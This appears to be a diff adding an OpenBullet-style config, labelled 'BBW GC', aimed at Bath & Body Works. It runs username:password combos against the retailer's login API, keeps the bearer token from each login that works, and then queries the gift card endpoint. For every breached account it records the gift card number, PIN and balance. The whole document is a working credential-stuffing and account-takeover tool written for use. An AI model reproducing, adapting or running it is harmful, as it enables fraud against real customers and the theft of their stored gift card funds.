@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "BBW GC",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-03T18:25:55.9386775+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "k4rox",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "auth" 
+
+REQUEST POST "https://www.bathandbodyworks.com/s/BathAndBodyWorks/dw/shop/v20_4/customers/auth?client_id=99c874ec-90ef-42fa-bf08-4becc2893202" 
+  CONTENT "{\"type\":\"credentials\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: BBW%20Loyalty/525 CFNetwork/1206 Darwin/20.1.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Authorization: Basic <auth>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" EqualTo "200" 
+
+PARSE "<HEADERS(Authorization)>" LR "Bearer " "" -> VAR "token" 
+
+FUNCTION RandomString "?h?h?h?h?h?h?h?h-?h?h?h?h-4?h?h?h-8?h?h?h-?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "dev" 
+
+FUNCTION ToUppercase "<dev>" -> VAR "guid" 
+
+REQUEST POST "https://api.bbw.com/payments/v2/giftcard" AcceptEncoding=FALSE 
+  CONTENT "{\"brand\":\"BBW\",\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.bbw.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "deviceId: <guid>" 
+  HEADER "User-Agent: BBW%20Loyalty/525 CFNetwork/1206 Darwin/20.1.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" EqualTo "200" 
+  KEYCHAIN Failure OR 
+    KEY "END-PAY-UNKNOWN_ERROR" 
+
+PARSE "<SOURCE>" JSON "cardNumber" Recursive=TRUE -> VAR "num" 
+
+PARSE "<SOURCE>" JSON "cardType" Recursive=TRUE -> VAR "type" 
+
+PARSE "<SOURCE>" JSON "pinNumber" Recursive=TRUE -> VAR "pin" 
+
+PARSE "<SOURCE>" LR "amount\":" "," Recursive=TRUE -> VAR "am" 
+
+PARSE "<SOURCE>" LR "currency\":\"" "\"" Recursive=TRUE -> VAR "curr" 
+
+FUNCTION Constant "Type= <type[*]>| Number= <num[*]>| Pin= <pin[*]>| Balance= <am[*]><curr[*]>" -> CAP "Capture" 
+
